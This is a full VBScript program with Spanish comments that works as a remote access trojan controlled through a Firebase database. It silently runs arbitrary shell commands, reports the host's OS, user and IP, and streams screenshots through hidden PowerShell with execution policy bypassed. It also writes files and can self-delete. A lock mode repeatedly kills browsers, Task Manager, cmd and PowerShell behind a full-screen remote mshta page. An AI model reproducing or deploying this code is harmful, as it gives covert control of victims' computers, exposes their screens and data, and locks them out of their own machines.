
Option Explicit

Dim BASE_URL : BASE_URL = "https://hello-74404-default-rtdb.europe-west1.firebasedatabase.app"
Dim POLL_MS : POLL_MS = 10000 ' cada 10s (Reducción de consumo)

Dim WshShell, WshNetwork, FSO
Dim logFilePath 

' --- Comprobación de Objetos Críticos ---
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
If Err.Number <> 0 Then WScript.Quit (1)

Set WshNetwork = CreateObject("WScript.Network")
If Err.Number <> 0 Then WScript.Quit (2)

Set FSO = CreateObject("Scripting.FileSystemObject")
If Err.Number <> 0 Then WScript.Quit (3)

' --- Configurar Log ---
logFilePath = FSO.BuildPath(WshShell.ExpandEnvironmentStrings("%TEMP%"), "cmdapp_logs.txt")
LogWrite "--- Script Iniciado (LiveStream v3) ---"
LogWrite "WshShell, WshNetwork, FSO creados."
On Error GoTo 0
' -----------------------------------------

Dim host
host = WshNetwork.ComputerName
LogWrite "Host: " & host
If host = "" Then
    LogWrite "Error: No se pudo obtener el nombre del host."
    WScript.Quit (4)
End If

Dim lastCommandId
lastCommandId = ""

' --- Ejecución Principal ---
LogWrite "Iniciando RunScript..."
RunScript

' --- Limpieza ---
LogWrite "Limpiando y saliendo..."
Cleanup
LogWrite "--- Script Finalizado ---"
WScript.Quit

' --- Subrutina de Log ---
Sub LogWrite(sMessage)
    On Error Resume Next
    Const ForAppending = 8
    Dim f
    Set f = FSO.OpenTextFile(logFilePath, ForAppending, True)
    If Err.Number = 0 Then
        f.WriteLine(Now() & " - " & sMessage)
        f.Close
    End If
    Set f = Nothing
End Sub

' --- Subrutina Principal ---
Sub RunScript()
    On Error Resume Next

    ' --- Comprobación de Bloqueo ---
    LogWrite "Comprobando bloqueo..."
    ' --- Comprobación de Bloqueo ---
    LogWrite "Comprobando bloqueo..."
    If CheckGlobalLock() Then
        LogWrite "Máquina bloqueada detectada. Entrando en modo restricción."
        LockedLoop
    End If
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante CheckGlobalLock: " & Err.Description
        WScript.Quit(5)
    End If

    ' --- Enviar info del sistema (solo una vez) ---
    LogWrite "Obteniendo información del sistema..."
    Dim sysInfoJSON : sysInfoJSON = GetSystemInfoJSON()
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante GetSystemInfoJSON: " & Err.Description
        WScript.Quit(6)
    End If

    LogWrite "Enviando info.json: " & sysInfoJSON
    httpPut BASE_URL & "/machines/" & EncodeJsonKey(host) & "/info.json", sysInfoJSON
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante el primer httpPut (info.json): " & Err.Description
        WScript.Quit(7)
    End If

    ' Heartbeat inicial
    LogWrite "Enviando heartbeat inicial..."
    UpdateHeartbeat GetEpochTime()
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante el primer Heartbeat: " & Err.Description
        WScript.Quit(8)
    End If

    LogWrite "Comprobando comandos inicial..."
    CheckCommand
    If Err.Number <> 0 Then
        LogWrite "Error fatal durante el primer CheckCommand: " & Err.Description
        WScript.Quit(9)
    End If

    On Error GoTo 0
    LogWrite "Entrando en bucle principal..."
    MainLoop
End Sub

Sub MainLoop()
    Do
        On Error Resume Next
        ' LogWrite "Poll..."
        WScript.Sleep POLL_MS
        UpdateHeartbeat GetEpochTime()
        CheckCommand
        If Err.Number <> 0 Then
            LogWrite "Error no fatal en MainLoop: " & Err.Description
            Err.Clear
        End If
        On Error GoTo 0
    Loop
End Sub

Function CheckGlobalLock()
    On Error Resume Next
    CheckGlobalLock = False
    Dim url, respText
    url = BASE_URL & "/lock/" & EncodeJsonKey(host) & ".json"
    respText = httpGet(url)
    
    If Err.Number <> 0 Then
        LogWrite "Error VBS en CheckGlobalLock: " & Err.Description
        Err.Clear
        Exit Function
    End If

    If Trim(respText) <> "null" And Len(Trim(respText)) > 0 Then
        CheckGlobalLock = True
    End If
End Function

Sub LockedLoop()
    LogWrite "MODO BLOQUEO ESTRICTO: Iniciando..."
    
    Dim lockUrl : lockUrl = "https://logise1.github.io/cmd/locked.html"
    
    ' Matar todo lo que pueda molestar al inicio
    KillInteractiveApps
    
    ' Lanzar MSHTA Pantalla Completa (Más difícil de cerrar que Chrome)
    OpenHTAKiosk lockUrl
    
    Dim unlockCmd
    Dim dbUnlock
    
    Do
        On Error Resume Next
        WScript.Sleep 10000 ' Ciclo relajado cada 10s
        
        ' 1. Check Desbloqueo
        dbUnlock = False
        If CheckGlobalLock() = False Then dbUnlock = True
        
        unlockCmd = CheckForUnlockCommand()
        If unlockCmd = True Then
             UnlockMachine 
             dbUnlock = True
        End If
        
        If dbUnlock Then Exit Do
        
        ' 2. Persistencia HTA
        If Not IsProcessRunning("mshta.exe") Then
            LogWrite "Candado cerrado -> Relanzando HTA..."
            OpenHTAKiosk lockUrl
        End If
        
        ' 3. RESTRICCIÓN TOTAL: Matar apps interactivas continuamente
        KillInteractiveApps
        
        UpdateHeartbeat GetEpochTime()
    Loop
    
    ' Salida: Matar HTA y restaurar
    WshShell.Run "taskkill /im mshta.exe /f", 0, False
    ' Opcional: Relanzar explorer si se mató (descomentar si se decide matar explorer)
    ' WshShell.Run "explorer.exe", 0, False 
    LogWrite "Bloqueo finalizado."
End Sub

Sub KillInteractiveApps()
    On Error Resume Next
    ' Matar navegadores
    WshShell.Run "taskkill /im chrome.exe /f", 0, False
    WshShell.Run "taskkill /im msedge.exe /f", 0, False
    WshShell.Run "taskkill /im firefox.exe /f", 0, False
    ' Matar herramientas de sistema
    WshShell.Run "taskkill /im Taskmgr.exe /f", 0, False
    WshShell.Run "taskkill /im cmd.exe /f", 0, False
    WshShell.Run "taskkill /im powershell.exe /f", 0, False
    ' Matar explorador (Opcional: muy agresivo, deja pantalla negra salvo el Kiosco)
    ' WshShell.Run "taskkill /im explorer.exe /f", 0, False 
End Sub

Sub OpenHTAKiosk(url)
    On Error Resume Next
    ' Usamos MSHTA puro.
    ' Para que salga pantalla completa, el HTML debería tener tags HTA, pero como es remoto,
    ' lanzamos MSHTA maximizado.
    ' Truco: Usar javascript dentro de mshta para redimensionar a screen.width/height y mover a 0,0
    
    Dim cmd
    ' Construimos un comando que abre una ventana HTA en blanco que luego navega a la URL
    ' y se pone fullscreen.
    ' Nota: mshta.exe url carga la url. Windows recuerda el tamaño.
    ' Forzamos maximizado con VBS wrapper inline o simplemente confiamos en el usuario.
    
    ' Método robusto: Lanza mshta con la URL directamente.
    ' Si la web sale vacía es porque mshta usa motor IE antiguo (IE7 mode por defecto).
    ' Hay que forzar modo standards. Pero eso depende del HTML remoto (<meta http-equiv="X-UA-Compatible" content="IE=edge" />)
    
    WshShell.Run "mshta """ & url & """", 3, False ' 3 = Maximized
End Sub

Sub OpenChromeKiosk(url)
    On Error Resume Next
    ' Usamos Chrome para el bloqueo visual
    CreateObject("WScript.Shell").Run "chrome.exe --new-window --kiosk """ & url & """", 0, False
End Sub

Sub OpenChromeKiosk(url)
    On Error Resume Next
    ' Usamos Chrome para el bloqueo visual
    CreateObject("WScript.Shell").Run "chrome.exe --new-window --kiosk """ & url & """", 0, False
End Sub

Function IsProcessRunning(procName)
    On Error Resume Next
    IsProcessRunning = False
    Dim colItems, objItem
    Set colItems = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_Process Where Name = '" & procName & "'")
    For Each objItem in colItems
        IsProcessRunning = True
        Exit For
    Next
    Set colItems = Nothing
End Function

Function CheckForUnlockCommand()
    On Error Resume Next
    CheckForUnlockCommand = False
    Dim url, respText, cmdText
    
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/command.json"
    respText = httpGet(url)
    
    If Trim(respText) = "null" Or Len(Trim(respText)) = 0 Then Exit Function
    
    ' Obtener cmdText manualmente o reutilizar lógica
    Dim posStart, posEnd
    posStart = InStr(respText, """cmd"":""")
    If posStart > 0 Then
        posStart = posStart + Len("""cmd"":""")
        posEnd = InStr(posStart, respText, """,""cwd"":""") 
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """,""id"":""")
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """}")
        
        If posEnd > 0 Then
            cmdText = Mid(respText, posStart, posEnd - posStart)
            cmdText = Replace(cmdText, "\""", """") 
        Else
            cmdText = "" 
        End If
    End If
    
    If LCase(Trim(cmdText)) = "/unlock" Then
        CheckForUnlockCommand = True
        Dim cmdId : cmdId = JsonGetField(respText, "id")
        WriteResponse cmdId, "MÁQUINA DESBLOQUEADA."
    End If
End Function

Sub UpdateHeartbeat(epochTime)
    On Error Resume Next
    Dim url, payload
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/status.json"
    payload = "{""online"":true,""lastSeen"":" & epochTime & "}"
    httpPut url, payload
    If Err.Number <> 0 Then LogWrite "Error en UpdateHeartbeat: " & Err.Description
End Sub

Sub CheckCommand()
    On Error Resume Next
    Dim url, respText, cmdId, cmdText, output, cwdText
    
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/command.json"
    respText = httpGet(url)
    
    If Err.Number <> 0 Then
        LogWrite "Error en httpGet de CheckCommand: " & Err.Description
        Exit Sub
    End If
    If Trim(respText) = "null" Or Len(Trim(respText)) = 0 Then
        Exit Sub
    End If

    cmdId = JsonGetField(respText, "id")
    cwdText = JsonGetField(respText, "cwd")
    
    ' --- Extracción de cmdText ---
    Dim posStart, posEnd
    posStart = InStr(respText, """cmd"":""")
    If posStart > 0 Then
        posStart = posStart + Len("""cmd"":""")
        posEnd = InStr(posStart, respText, """,""cwd"":""") 
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """,""id"":""")
        If posEnd = 0 Then posEnd = InStr(posStart, respText, """}")
        
        If posEnd > 0 Then
            cmdText = Mid(respText, posStart, posEnd - posStart)
            cmdText = Replace(cmdText, "\""", """") 
        Else
            cmdText = "" 
        End If
    Else
        cmdText = ""
    End If
    
    If cmdId = "" Then Exit Sub
    If cmdId = lastCommandId Then Exit Sub

    LogWrite "Nuevo comando ID: " & cmdId
    lastCommandId = cmdId

    If cmdText = "" Then
        WriteResponse cmdId, "ERROR: campo cmd vacío."
        Exit Sub
    End If
    
    If cwdText = "" Then
        cwdText = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%")
    End If

    LogWrite "Comando recibido: " & cmdText

    Dim trimmedCmdLower : trimmedCmdLower = LCase(Trim(cmdText))

    If trimmedCmdLower = "/destruct" Then
        WriteResponse cmdId, "AUTODESTRUCCIÓN INICIADA..."
        SelfDestruct
        WScript.Quit

    ElseIf trimmedCmdLower = "/lock" Then
        WriteResponse cmdId, "Bloqueando máquina (Restricción de Navegadores)..."
        LockMachine
        LockedLoop

    ElseIf trimmedCmdLower = "/unlock" Then
        WriteResponse cmdId, "La máquina ya está desbloqueada."
        UnlockMachine
    
    ElseIf trimmedCmdLower = "/screenshot" Then
        LogWrite "CheckCommand: Ejecutando /screenshot (simple)"
        DoScreenshot cmdId, cwdText

    ElseIf trimmedCmdLower = "/livestream" Then
        LogWrite "CheckCommand: INICIANDO MODO LIVESTREAM OPTIMIZADO"
        RunLivestream cmdId, cwdText

    ElseIf Left(trimmedCmdLower, 7) = "/upload" AND InStr(trimmedCmdLower, " > ") > 0 Then
        ' ... (Código de Upload igual que antes) ...
        Dim posDelimiter, contentPart, filenamePart, content, filename
        posDelimiter = InStrRev(cmdText, " > ")
        If posDelimiter > 0 Then
            filenamePart = Trim(Mid(cmdText, posDelimiter + Len(" > ")))
            contentPart = Trim(Mid(cmdText, Len("/upload") + 1, posDelimiter - (Len("/upload") + 1)))
            
            If Left(filenamePart, 1) = """" And Right(filenamePart, 1) = """" Then
                filename = Mid(filenamePart, 2, Len(filenamePart) - 2)
            Else
                filename = filenamePart
            End If
            
            If Left(contentPart, 1) = """" And Right(contentPart, 1) = """" Then
                content = Mid(contentPart, 2, Len(contentPart) - 2)
            Else
                content = contentPart
            End If
            
            If filename = "" Or content = "" Then
                WriteResponse cmdId, "ERROR: Formato de /upload incorrecto."
            Else
                output = ExecUpload(content, filename, cwdText)
                WriteResponse cmdId, output
            End If
        Else
            WriteResponse cmdId, "ERROR: Formato de /upload incorrecto (falta ' > ')."
        End If
    
    Else
        output = ExecCommand(cmdText, cwdText)
        WriteResponse cmdId, output
    End If
    
    On Error GoTo 0
End Sub

' --- NUEVO: Manejador del Livestream (Modo Simple Solicitado) ---
Sub RunLivestream(initialCmdId, cwd)
    On Error Resume Next
    Dim expiryTime, currentCmdId, loopCmdId, loopResp
    Dim b64, frameCounter
    
    currentCmdId = initialCmdId
    WriteResponse currentCmdId, "INICIANDO LIVESTREAM (Captura Simple - 20s Timeout)"
    
    ' Definir tiempo de fin (20 segundos)
    expiryTime = DateAdd("s", 20, Now())
    frameCounter = 0
    
    Do While Now() < expiryTime
        ' 1. Capturar (Directo VBS -> PS -> File)
        b64 = CaptureScreenshotBase64(cwd)
        
        ' 2. Enviar si es válido
        If Left(b64, 5) <> "ERROR" And Len(b64) > 100 Then
            frameCounter = frameCounter + 1
            WriteScreenshotToFirebase currentCmdId & "_f" & frameCounter, b64
        End If
        
        ' 3. Esperar 0.5s
        WScript.Sleep 10
        
        ' 4. Chequear comandos para Renovación o Interrupción
        loopResp = httpGet(BASE_URL & "/machines/" & EncodeJsonKey(host) & "/command.json")
        If Trim(loopResp) <> "null" And Len(Trim(loopResp)) > 0 Then
            loopCmdId = JsonGetField(loopResp, "id")
            
            If loopCmdId <> "" And loopCmdId <> currentCmdId Then
                If InStr(LCase(loopResp), """cmd"":""/livestream""") > 0 Then
                    ' RENEWAL
                    LogWrite "Livestream: Renovado por " & loopCmdId
                    expiryTime = DateAdd("s", 20, Now())
                    currentCmdId = loopCmdId
                    lastCommandId = loopCmdId ' Actualizar global para que MainLoop no lo repita
                    frameCounter = 0
                    WriteResponse currentCmdId, "Livestream RENOVADO."
                Else
                    ' Otro comando -> Salir para que MainLoop lo procese
                    LogWrite "Livestream: Interrumpido por otro comando."
                    Exit Do
                End If
            End If
        End If
        
        On Error Resume Next
    Loop
    
    WriteResponse currentCmdId, "Livestream FINALIZADO (Timeout)."
End Sub

' Function Helper para capturar un screenshot limpio en Base64
Function CaptureScreenshotBase64(cwd)
    On Error Resume Next
    Dim psCmd, base64String, tempFile, fileStream
    Dim localFSO, localShell
    
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    Set localShell = CreateObject("WScript.Shell")
    
    ' Archivo temporal único
    tempFile = localFSO.BuildPath(localShell.ExpandEnvironmentStrings("%TEMP%"), "scr_" & localFSO.GetTempName())
    
    ' Comando PS (una sola línea) para capturar y guardar Base64
    psCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $gfx = [System.Drawing.Graphics]::FromImage($bmp); $gfx.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size); $ms = New-Object System.IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg); $bmp.Dispose(); $gfx.Dispose(); $bytes = $ms.ToArray(); $ms.Dispose(); [Convert]::ToBase64String($bytes) | Out-File -FilePath '" & tempFile & "' -Encoding ascii"""
    
    localShell.CurrentDirectory = cwd
    localShell.Run psCmd, 0, True ' Esperar a que termine
    
    If localFSO.FileExists(tempFile) Then
        Set fileStream = localFSO.OpenTextFile(tempFile, 1)
        If Not fileStream.AtEndOfStream Then
            base64String = fileStream.ReadAll()
        End If
        fileStream.Close
        localFSO.DeleteFile tempFile, True
    Else
        base64String = "ERROR_NO_FILE"
    End If
    
    ' Limpiar saltos de línea
    base64String = Replace(base64String, vbCrLf, "")
    base64String = Replace(base64String, vbCr, "")
    base64String = Replace(base64String, vbLf, "")
    
    CaptureScreenshotBase64 = base64String
End Function

Sub DoScreenshot(cmdId, cwd)
    On Error Resume Next
    Dim b64
    LogWrite "Ejecutando Screenshot Simple..."
    b64 = CaptureScreenshotBase64(cwd)
    
    If Left(b64, 5) = "ERROR" Or Len(b64) < 100 Then
         WriteResponse cmdId, "ERROR al capturar screenshot: " & b64
    Else
         WriteScreenshotToFirebase cmdId, b64
         WriteResponse cmdId, "Screenshot enviado OK." 
    End If
End Sub

Function ExecCommand(cmd, cwd)
    On Error Resume Next
    Err.Clear
    LogWrite "ExecCommand: " & cmd & " EN " & cwd
    Dim tempFile, fullCmd, output, fileStream, shell, localFSO
    
    Set shell = CreateObject("WScript.Shell")
    Set localFSO = CreateObject("Scripting.FileSystemObject")

    shell.CurrentDirectory = cwd
    If Err.Number <> 0 Then
        ExecCommand = "ERROR: No se pudo cambiar dir a: " & cwd
        Exit Function
    End If

    Dim trimmedLower : trimmedLower = LCase(Trim(cmd))
    If Left(trimmedLower, 6) = "start " Then
        shell.Run "cmd /c " & cmd, 0, False
        output = "[Comando 'start' ejecutado]"
    Else
        tempFile = localFSO.BuildPath(shell.ExpandEnvironmentStrings("%TEMP%"), localFSO.GetTempName())
        fullCmd = "cmd /c " & cmd & " > """ & tempFile & """ 2>&1"
        shell.Run fullCmd, 0, True 

        output = ""
        If localFSO.FileExists(tempFile) Then
            Set fileStream = localFSO.OpenTextFile(tempFile, 1)
            If Not fileStream.AtEndOfStream Then
                output = fileStream.ReadAll()
            End If
            fileStream.Close
            localFSO.DeleteFile tempFile, True
        Else
            output = "[ERROR: Sin salida]"
        End If
    End If
    
    ExecCommand = output
    Set shell = Nothing
    Set localFSO = Nothing
    On Error GoTo 0
End Function
    
Function ExecUpload(textContent, filename, cwd)
    On Error Resume Next
    Err.Clear
    LogWrite "ExecUpload: " & filename & " EN " & cwd
    Dim localFSO, finalPath, fs
    Set localFSO = CreateObject("Scripting.FileSystemObject")
    If Not localFSO.FolderExists(cwd) Then
        ExecUpload = "ERROR: Dir destino '" & cwd & "' no existe."
        Exit Function
    End If
    finalPath = localFSO.BuildPath(cwd, filename)
    Const ForWriting = 2
    Set fs = localFSO.OpenTextFile(finalPath, ForWriting, True) 
    If Err.Number <> 0 Then
        ExecUpload = "ERROR: Fallo al crear archivo. " & Err.Description
        Exit Function
    End If
    fs.Write textContent
    fs.Close
    ExecUpload = "Archivo " & finalPath & " creado."
    Set fs = Nothing
    Set localFSO = Nothing
End Function

Sub WriteResponse(cmdId, text)
    On Error Resume Next
    Dim url, payload, safeText
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/lastResponse.json"
    safeText = JsonEscape(EncodeBase64(text))
    payload = "{""id"":""" & JsonEscape(cmdId) & """,""response"":""" & safeText & """,""timestamp"":" & GetEpochTime() & "}"
    httpPut url, payload
End Sub

Sub WriteScreenshotToFirebase(cmdId, b64string)
    On Error Resume Next
    Dim url, payload
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & "/screenshot.json"
    payload = "{""id"":""" & JsonEscape(cmdId) & """,""data"":""" & b64string & """,""timestamp"":" & GetEpochTime() & "}"
    httpPut url, payload
    On Error GoTo 0
End Sub

' ---------- Helpers HTTP ----------
Function httpGet(url)
    On Error Resume Next
    Dim xhr
    Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then
        httpGet = "null"
        Exit Function
    End If
    xhr.Open "GET", url, False
    xhr.setRequestHeader "Content-Type", "application/json"
    xhr.send
    If Err.Number <> 0 Then
        httpGet = "null"
    Else
        httpGet = xhr.responseText
    End If
    Set xhr = Nothing
End Function
Sub httpPut(url, body)
    On Error Resume Next
    Dim xhr
    Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then Exit Sub
    xhr.Open "PUT", url, False
    xhr.setRequestHeader "Content-Type", "application/json"
    xhr.send body
    Set xhr = Nothing
End Sub
Sub httpDelete(url)
    On Error Resume Next
    Dim xhr
    Set xhr = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number <> 0 Then Exit Sub
    xhr.Open "DELETE", url, False
    xhr.setRequestHeader "Content-Type", "application/json"
    xhr.send
    Set xhr = Nothing
End Sub
' ------------------------------------------------

Sub Cleanup()
    On Error Resume Next
    Dim url
    url = BASE_URL & "/machines/" & EncodeJsonKey(host) & ".json"
    httpDelete url
End Sub

Sub LockMachine()
    On Error Resume Next
    Dim url, payload
    url = BASE_URL & "/lock/" & EncodeJsonKey(host) & ".json"
    payload = """locked"""
    httpPut url, payload
End Sub

Sub UnlockMachine()
    On Error Resume Next
    Dim url
    url = BASE_URL & "/lock/" & EncodeJsonKey(host) & ".json"
    httpDelete url
End Sub

Sub SelfDestruct()
    On Error Resume Next
    Cleanup
    Dim scriptPath, cmd
    scriptPath = WScript.ScriptFullName
    cmd = "cmd.exe /c ping 127.0.0.1 -n 4 > nul & del """ & scriptPath & """"
    WshShell.Run cmd, 0, False
End Sub

Function GetSystemInfoJSON()
    On Error Resume Next
    Dim os, user, ip, output, lines, line, i, currentIp, gateway, initialCWD
    initialCWD = CreateObject("WScript.Shell").CurrentDirectory
    os = "Desconocido"
    os = CreateObject("WScript.Shell").RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
    user = CreateObject("WScript.Network").UserName
    ip = "No encontrada"
    currentIp = ""
    gateway = ""
    output = ExecCommand("ipconfig", "C:\")
    lines = Split(output, vbCrLf)
    For i = 0 To UBound(lines)
        line = Trim(lines(i))
        If InStr(line, "IPv4") > 0 And InStr(line, ":") > 0 Then
            Dim parts : parts = Split(line, ":")
            If UBound(parts) > 0 Then
                Dim tempIp : tempIp = Trim(parts(1))
                If InStr(tempIp, ".") > 0 Then currentIp = tempIp
            End If
        End If
        If InStr(line, "Puerta de enlace predeterminada") > 0 And InStr(line, ":") > 0 Then
            parts = Split(line, ":")
            If UBound(parts) > 0 Then
                gateway = Trim(parts(1))
                If gateway <> "" And currentIp <> "127.0.0.1" Then
                    ip = currentIp
                    Exit For
                End If
            End If
        End If
    Next
    If ip = "No encontrada" And currentIp <> "" And currentIp <> "127.0.0.1" Then ip = currentIp
    GetSystemInfoJSON = "{""os"":""" & JsonEscape(EncodeBase64(os)) & """,""user"":""" & JsonEscape(EncodeBase64(user)) & """,""ip"":""" & JsonEscape(EncodeBase64(ip)) & """,""cwd"":""" & JsonEscape(EncodeBase64(initialCWD)) & """}"
End Function

' --- Helpers JSON ---
Function JsonGetField(json, key)
    On Error Resume Next
    JsonGetField = ""
    Dim patt, re, m, k
    k = """" & key & """"
    patt = k & "\s*:\s*""([^""]*)"""
    Set re = New RegExp
    re.Pattern = patt
    re.IgnoreCase = True
    re.Global = False
    If re.Test(json) Then
        Set m = re.Execute(json)
        JsonGetField = m(0).SubMatches(0)
    End If
    Set re = Nothing
End Function
Function JsonEscape(s)
    On Error Resume Next
    If IsNull(s) Then s = ""
    s = Replace(s, "\", "\\")
    s = Replace(s, """", "\""")
    s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbCr, "\n")
    s = Replace(s, vbLf, "\n")
    s = Replace(s, vbTab, "\t")
    s = Replace(s, "/", "\/")
    JsonEscape = s
End Function

Function EncodeBase64(sIn)
    On Error Resume Next
    Dim oXML, oNode, bIn, oStream
    Set oStream = CreateObject("ADODB.Stream")
    If Err.Number <> 0 Then
        EncodeBase64 = "ERROR_BASE64"
        Exit Function
    End If
    oStream.Type = 2 
    oStream.Charset = "Windows-1252" 
    oStream.Open
    oStream.WriteText sIn
    oStream.Position = 0
    oStream.Type = 1 
    bIn = oStream.Read
    oStream.Close
    Set oStream = Nothing
    Set oXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set oNode = oXML.createElement("b64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = bIn
    EncodeBase64 = oNode.text
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function EncodeJsonKey(s)
    On Error Resume Next
    s = Replace(s, " ", "_")
    s = Replace(s, ".", "_")
    s = Replace(s, "$", "_")
    s = Replace(s, "[", "_")
    s = Replace(s, "]", "_")
    s = Replace(s, "#", "_")
    s = Replace(s, "/", "_")
    EncodeJsonKey = s
End Function

Function GetTimezoneBias()
    On Error Resume Next
    GetTimezoneBias = 0
    Dim objWMIService, colItems, objItem
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_TimeZone")
    For Each objItem in colItems
        GetTimezoneBias = objItem.Bias
        Exit For
    Next
    Set objWMIService = Nothing
    Set colItems = Nothing
    Set objItem = Nothing
End Function

Function GetEpochTime()
    On Error Resume Next
    Dim biasMinutes : biasMinutes = GetTimezoneBias()
    Dim localNow : localNow = Now()
    Dim utcNow : utcNow = DateAdd("n", biasMinutes, localNow)
    GetEpochTime = DateDiff("s", "01/01/1970 00:00:00", utcNow)
    If Err.Number <> 0 Then
        GetEpochTime = DateDiff("s", "01/01/1970 00:00:00", Now())
    End If
End Function